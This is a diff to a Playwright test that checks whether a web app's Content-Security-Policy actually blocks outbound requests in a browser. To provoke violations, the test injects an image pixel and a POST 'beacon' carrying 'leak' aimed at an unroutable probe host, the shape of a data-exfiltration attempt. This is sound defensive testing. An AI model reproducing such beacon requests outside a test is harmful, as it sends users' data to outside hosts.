@@ -1,19 +1,30 @@
 /**
- * #1256 — the CSP's egress directives actually BLOCK, in a real browser.
+ * Journey 47: the CSP's egress directives actually BLOCK, in a real browser (#1256)
  *
  * Imports from "@playwright/test" instead of "./fixtures" on purpose: this journey
  * provokes CSP violations, and a blocked request logs a console error, which the
  * shared fixture (rightly) treats as a failure. That fixture is what makes every
- * OTHER journey a CSP regression guard for free — here we need the opposite.
+ * OTHER journey a `connect-src` regression guard for free — here we need the
+ * opposite. What the fixture would also have caught is kept below: uncaught page
+ * errors are collected and asserted empty, so opting out of the console channel
+ * does not silently opt out of the rest of the net.
  *
  * The assertion that matters is `disposition === "enforce"`: report-only fires the
  * same event with `disposition === "report"`, so a policy that only observes fails
- * this spec. That is the whole difference #1256 is about.
+ * this spec. That is the whole difference #1256 is about. The exact directive VALUES
+ * are pinned in `apps/web/app/security-headers.test.ts`, not here — this spec's job
+ * is that the header reaches the browser and bites.
  */
 import { expect, test } from "@playwright/test";
 
 /** Never resolves, so nothing leaves the machine even if the policy were absent. */
 const UNLISTED_HOST = "https://csp-probe.invalid";
+
+declare global {
+  interface Window {
+    __cspBlocked?: string[];
+  }
+}
 
 test.describe("CSP enforcement", () => {
   test("serves the enforced header alongside the full report-only policy", async ({
@@ -23,49 +34,54 @@ test.describe("CSP enforcement", () => {
     const headers = response?.headers() ?? {};
 
     const enforced = headers["content-security-policy"] ?? "";
-    expect(enforced).toContain("img-src 'self' data: https://en.numista.com");
-    expect(enforced).toContain("connect-src 'self'");
+    expect(enforced).toContain("img-src ");
+    expect(enforced).toContain("connect-src ");
     // The back door: enforcing default-src would enforce script-src/style-src too.
     expect(enforced).not.toContain("default-src");
 
     // The rest of the target policy keeps being observed, not dropped.
-    const reportOnly = headers["content-security-policy-report-only"] ?? "";
-    expect(reportOnly).toContain("default-src 'self'");
-    expect(reportOnly).toContain("frame-ancestors 'none'");
+    expect(headers["content-security-policy-report-only"] ?? "").toContain(
+      "default-src ",
+    );
   });
 
   test("blocks a remote image and a cross-origin fetch to an unlisted host", async ({
     page,
   }) => {
+    const pageErrors: string[] = [];
+    page.on("pageerror", (error) => pageErrors.push(error.message));
+
     await page.goto("/");
 
-    const blocked = await page.evaluate(async (host) => {
-      const enforcedDirectives: string[] = [];
-      const listener = (event: SecurityPolicyViolationEvent) => {
+    await page.evaluate(() => {
+      window.__cspBlocked = [];
+      document.addEventListener("securitypolicyviolation", (event) => {
         if (event.disposition === "enforce") {
-          enforcedDirectives.push(event.effectiveDirective);
+          window.__cspBlocked?.push(event.effectiveDirective);
         }
-      };
-      document.addEventListener("securitypolicyviolation", listener);
+      });
+    });
 
+    await page.evaluate(async (host) => {
       // The exfiltration shape #1246 closed at the render seam: an outbound GET
       // the browser makes with no click.
       const img = document.createElement("img");
       img.src = `${host}/pixel.png?d=leak`;
       document.body.appendChild(img);
       try {
-        await fetch(`${host}/beacon`, { method: "POST", body: "leak" });
+        await fetch(`${host}/beacon`, { body: "leak", method: "POST" });
       } catch {
         // A blocked fetch rejects; the violation event is what we assert on.
       }
-      await new Promise((resolve) => setTimeout(resolve, 500));
-
-      document.removeEventListener("securitypolicyviolation", listener);
       img.remove();
-      return enforcedDirectives;
     }, UNLISTED_HOST);
 
-    expect(blocked).toContain("img-src");
-    expect(blocked).toContain("connect-src");
+    // Polled, not slept: the violation events land asynchronously and a fixed wait
+    // is a flake with `retries: 0` (#1250).
+    await expect
+      .poll(async () => page.evaluate(() => window.__cspBlocked ?? []))
+      .toEqual(expect.arrayContaining(["img-src", "connect-src"]));
+
+    expect(pageErrors, "a blocked request must not throw into the page").toEqual([]);
   });
 });
